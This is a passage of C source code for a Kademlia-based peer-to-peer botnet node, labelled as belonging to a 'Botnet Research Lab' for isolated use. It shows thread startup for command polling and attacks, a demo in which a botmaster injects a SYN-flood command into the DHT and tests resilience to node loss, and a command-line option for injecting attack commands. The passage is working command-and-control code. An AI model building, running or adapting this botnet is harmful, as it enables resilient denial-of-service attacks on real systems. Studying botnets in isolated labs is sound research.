    struct timeval tv={1,0};setsockopt(n->sock,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
    struct sockaddr_in ba={0};ba.sin_family=AF_INET;ba.sin_addr.s_addr=INADDR_ANY;ba.sin_port=port_nbo;
    if(bind(n->sock,(struct sockaddr*)&ba,sizeof(ba))<0){perror("bind");return -1;}
    n->running=1;return 0;
}

static void node_start_threads(KademliaNode *n){
    pthread_create(&n->recv_tid,NULL,recv_loop,n);
    pthread_create(&n->refresh_tid,NULL,bucket_refresh_thread,n);
    pthread_create(&n->poll_tid,NULL,command_poll_thread,n);
    pthread_create(&n->replicate_tid,NULL,replicate_thread,n);
    pthread_create(&n->status_tid,NULL,status_thread,n);
    pthread_create(&n->bootstrap_tid,NULL,periodic_bootstrap_thread,n);
    pthread_create(&n->republish_tid,NULL,republish_thread,n);
    pthread_create(&n->expiry_tid,NULL,expiry_loop,n);
}

static void node_stop(KademliaNode *n){n->running=0;stop_all_attacks(n);close(n->sock);}

static void sigint_handler(int sig){(void)sig;printf("\n[P2P] SIGINT -- shutting down...\n");if(g_node)node_stop(g_node);}

/* ── Demo ───────────────────────────────────────────────────────────── */
static void run_demo(void){
    printf("==============================================\n Kademlia P2P Demo -- 5-node local mesh\n AUA Botnet Research Lab\n Compatible with p2p_node.py --demo\n==============================================\n\n");
    const int N=5;static KademliaNode nodes[5];
    uint16_t ports[5]={htons(7500),htons(7501),htons(7502),htons(7503),htons(7504)};
    for(int i=0;i<N;i++){if(node_init(&nodes[i],"127.0.0.1",ports[i],1)<0){fprintf(stderr,"[DEMO] node_init failed\n");return;}pthread_create(&nodes[i].recv_tid,NULL,recv_loop,&nodes[i]);}
    usleep(200000);
    for(int i=1;i<N;i++){bootstrap_from(&nodes[i],"127.0.0.1",ports[0]);usleep(100000);}
    sleep(2);
    printf("\n[DEMO] Botmaster injecting syn_flood command via node 0...\n");
    uint8_t cmd_key[ID_BYTES];sha1_str(COMMAND_KEY,cmd_key);
    const char *cmd="{\"type\":\"syn_flood\",\"target\":\"192.168.100.20\",\"port\":80,\"duration\":5}";
    store_value(&nodes[0],cmd_key,cmd,strlen(cmd),1);sleep(1);
    printf("\n[DEMO] All nodes polling DHT for command...\n");int fc=0;
    for(int i=0;i<N;i++){char found[MAX_VALUE_LEN];int ok=iterative_find_value(&nodes[i],cmd_key,found,MAX_VALUE_LEN);char h[9]={0};for(int j=0;j<4;j++)sprintf(h+j*2,"%02x",nodes[i].self_id[j]);printf("  Node %s... %s\n",h,ok?"FOUND":"not found");if(ok)fc++;}
    printf("[DEMO] %d/%d nodes found the command\n\n",fc,N);
    printf("[DEMO] -- Resilience test: killing 2/%d nodes (40%%) --\n",N);nodes[1].running=0;nodes[3].running=0;sleep(2);
    printf("[DEMO] Survivors polling DHT...\n");int sf=0;int survivors[]={0,2,4};
    for(int s=0;s<3;s++){int i=survivors[s];char found[MAX_VALUE_LEN];int ok=iterative_find_value(&nodes[i],cmd_key,found,MAX_VALUE_LEN);char h[9]={0};for(int j=0;j<4;j++)sprintf(h+j*2,"%02x",nodes[i].self_id[j]);printf("  Survivor %s... %s\n",h,ok?"command STILL FOUND":"not found");if(ok)sf++;}
    printf("[DEMO] %d/3 survivors found command after 40%% node loss\n",sf);printf("[DEMO] P2P resilience demonstrated.\n\n");
    for(int i=0;i<N;i++)nodes[i].running=0;sleep(1);
}

/* ── main ───────────────────────────────────────────────────────────── */
int main(int argc,char *argv[]){
    seed_random();signal(SIGINT,sigint_handler);
    char host[64]="127.0.0.1";int port=7400,demo_mode=0,inject_mode=0,server_mode=1;
    char inject_json[MAX_VALUE_LEN]={0};
    char seed_hosts[MAX_SEEDS][64];uint16_t seed_ports[MAX_SEEDS];int n_seeds=0;

    for(int i=1;i<argc;i++){
        if(strcmp(argv[i],"--host")==0&&i+1<argc)strncpy(host,argv[++i],63);
        else if(strcmp(argv[i],"--port")==0&&i+1<argc)port=atoi(argv[++i]);
        else if(strcmp(argv[i],"--bootstrap")==0&&i+1<argc&&n_seeds<MAX_SEEDS){
            char *arg=argv[++i];char *colon=strrchr(arg,':');
            if(colon&&n_seeds<MAX_SEEDS){size_t hl=(size_t)(colon-arg);if(hl>63)hl=63;strncpy(seed_hosts[n_seeds],arg,hl);seed_hosts[n_seeds][hl]='\0';seed_ports[n_seeds]=htons((uint16_t)atoi(colon+1));n_seeds++;}
        }
        else if(strcmp(argv[i],"--inject")==0&&i+1<argc){strncpy(inject_json,argv[++i],MAX_VALUE_LEN-1);inject_mode=1;}
        else if(strcmp(argv[i],"--demo")==0)demo_mode=1;
        else if(strcmp(argv[i],"--client")==0)server_mode=0;
        else if(strcmp(argv[i],"--help")==0){printf("Usage: %s [--host H] [--port P] [--bootstrap H:P] [--inject JSON] [--demo] [--client]\n",argv[0]);return 0;}
    }

    printf("==============================================\n Kademlia P2P Node -- AUA Botnet Research Lab\n ISOLATED ENVIRONMENT ONLY\n==============================================\n\n");
    if(demo_mode){run_demo();return 0;}

    static KademliaNode node;g_node=&node;
    uint16_t port_nbo=htons((uint16_t)port);
    if(node_init(&node,host,port_nbo,server_mode)<0)return 1;
    node_start_threads(&node);sleep(1);
    for(int i=0;i<n_seeds;i++)bootstrap_from(&node,seed_hosts[i],seed_ports[i]);

    if(inject_mode){
        sleep(2);uint8_t cmd_key[ID_BYTES];sha1_str(COMMAND_KEY,cmd_key);
        int acks=store_value(&node,cmd_key,inject_json,strlen(inject_json),1);
        printf("[P2P] Command injected: %s | acks: %d\n",inject_json,acks);sleep(1);node_stop(&node);return 0;
    }
    printf("[P2P] Running. Ctrl+C to stop.\n\n");while(node.running)sleep(1);return 0;
}